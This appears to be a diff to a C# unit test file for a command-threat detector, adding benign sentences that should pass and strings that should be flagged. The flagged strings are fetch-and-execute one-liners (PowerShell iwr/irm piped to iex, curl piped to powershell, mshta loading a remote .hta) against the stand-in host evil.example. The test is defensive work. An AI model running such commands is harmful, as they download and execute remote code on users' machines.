@@ -40,9 +40,31 @@ public class CommandDetectorTests
     [InlineData("A123456789")]
     [InlineData("https://github.com/powershell/powershell")]  // 網址裡出現 powershell 不該算
     [InlineData("我在學 PowerShell 的 iex 指令")]
+    [InlineData("I use powershell every day")]                // #8：英文句子不該算
+    [InlineData("I use powershell")]
+    [InlineData("Open pwsh and type your name")]
+    [InlineData("mshta is a legacy tool")]
+    [InlineData("I like powershell - it's great")]
     public void 一般文字判為乾淨(string? text)
     {
         Assert.Equal(ThreatLevel.None, CommandDetector.Analyze(text).Level);
+    }
+
+    // #8：程式名稱後面直接接 cmdlet／別名、腳本或管線時仍要抓到。
+    [Theory]
+    [InlineData("powershell iwr https://evil.example/a | iex")]
+    [InlineData("powershell iex(iwr https://evil.example/a)")]
+    [InlineData("powershell Invoke-WebRequest https://evil.example/a -OutFile a.exe")]
+    [InlineData("powershell Start-Process calc")]
+    [InlineData("powershell $u='https://evil.example';iex(irm $u)")]
+    [InlineData("powershell .\\setup.ps1")]
+    [InlineData("curl -s https://evil.example/x | powershell")]
+    [InlineData("pwsh -NoProfile -File a.ps1")]
+    [InlineData("mshta https://evil.example/a.hta")]
+    [InlineData("mshta vbscript:Execute(\"x\")")]
+    public void 真正的呼叫仍判為有執行訊號(string text)
+    {
+        Assert.NotEqual(ThreatLevel.None, CommandDetector.Analyze(text).Level);
     }
 
     [Fact]
